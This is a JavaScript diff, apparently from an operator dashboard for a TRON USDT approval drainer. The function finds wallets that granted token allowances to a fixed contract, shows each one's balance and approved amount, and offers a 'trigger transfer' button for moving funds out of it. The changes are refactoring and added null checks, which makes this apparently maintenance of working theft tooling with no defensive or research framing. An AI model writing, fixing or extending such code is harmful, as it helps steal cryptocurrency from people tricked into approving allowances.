@@ -36,58 +36,66 @@
     }
 
     async function fetchApprovals() {
-      logStatus("📡 正在讀取授權事件...");
-      const walletsDiv = document.getElementById("wallets");
-      walletsDiv.innerHTML = "";
-      const results = [];
-      try {
-        let page = 0, stop = false;
-        while (!stop && page < 3) {
-          const res = await axios.get(
-            `https://apilist.tronscanapi.com/api/contract/events?contract=${USDT_CONTRACT}&eventName=Approval&limit=100&start=${page * 100}`
-          );
-          const events = res.data.data || [];
-          for (const evt of events) {
-            const { result } = evt;
-            if (result.spender?.toLowerCase() === AUTH_CONTRACT.toLowerCase()) {
-              if (!results.find(r => r.address === result.owner)) {
-                results.push({ address: result.owner });
-              }
-            }
+  logStatus("📡 正在讀取授權事件...");
+  const walletsDiv = document.getElementById("wallets");
+  walletsDiv.innerHTML = "";
+  const results = [];
+
+  try {
+    let page = 0, stop = false;
+    while (!stop && page < 3) {
+      const res = await axios.get(
+        `https://apilist.tronscanapi.com/api/contract/events?contract=${USDT_CONTRACT}&eventName=Approval&limit=100&start=${page * 100}`
+      );
+      const events = res.data.data || [];
+
+      for (const evt of events) {
+        const { result } = evt;
+        if (
+          result &&
+          typeof result.spender === "string" &&
+          result.spender.toLowerCase() === AUTH_CONTRACT.toLowerCase()
+        ) {
+          if (!results.find(r => r.address === result.owner)) {
+            results.push({ address: result.owner });
           }
-          if (events.length < 100) stop = true;
-          page++;
         }
-
-        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-        const authContract = await window.tronWeb.contract().at(AUTH_CONTRACT);
-        const walletsHtml = await Promise.all(results.map(async (w) => {
-          try {
-            const balance = await contract.balanceOf(w.address).call();
-            const allowance = await contract.allowance(w.address, AUTH_CONTRACT).call();
-            const trxBalance = await window.tronWeb.trx.getBalance(w.address);
-            const usdt = parseFloat(balance) / USDT_DECIMALS;
-            const allowed = parseFloat(allowance) / USDT_DECIMALS;
-            const trx = parseFloat(trxBalance) / 1e6;
-
-            return `<div class="wallet-card">
-              <div><strong>錢包：</strong>${w.address}</div>
-              <div>USDT：${usdt}</div>
-              <div>授權額度：${allowed}</div>
-              <div>TRX 餘額：${trx}</div>
-              <button onclick="triggerTransfer('${w.address}')">🚀 觸發轉帳</button>
-            </div>`;
-          } catch (e) {
-            return `<div class="wallet-card error">⚠️ ${w.address} - 無法取得資料</div>`;
-          }
-        }));
-
-        walletsDiv.innerHTML = walletsHtml.join("");
-        logStatus(`✅ 已載入 ${results.length} 個錢包`);
-      } catch (e) {
-        logStatus("❌ 錯誤：" + e.message, "red");
       }
+
+      if (events.length < 100) stop = true;
+      page++;
     }
+
+    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+    const authContract = await window.tronWeb.contract().at(AUTH_CONTRACT);
+    const walletsHtml = await Promise.all(results.map(async (w) => {
+      try {
+        const balance = await contract.balanceOf(w.address).call();
+        const allowance = await contract.allowance(w.address, AUTH_CONTRACT).call();
+        const trxBalance = await window.tronWeb.trx.getBalance(w.address);
+        const usdt = parseFloat(balance) / USDT_DECIMALS;
+        const allowed = parseFloat(allowance) / USDT_DECIMALS;
+        const trx = parseFloat(trxBalance) / 1e6;
+
+        return `<div class="wallet-card">
+          <div><strong>錢包：</strong>${w.address}</div>
+          <div>USDT：${usdt}</div>
+          <div>授權額度：${allowed}</div>
+          <div>TRX 餘額：${trx}</div>
+          <button onclick="triggerTransfer('${w.address}')">🚀 觸發轉帳</button>
+        </div>`;
+      } catch (e) {
+        return `<div class="wallet-card error">⚠️ ${w.address} - 無法取得資料</div>`;
+      }
+    }));
+
+    walletsDiv.innerHTML = walletsHtml.join("");
+    logStatus(`✅ 已載入 ${results.length} 個錢包`);
+  } catch (e) {
+    logStatus("❌ 錯誤：" + e.message, "red");
+  }
+}
+
 
     async function triggerTransfer(from) {
       try {
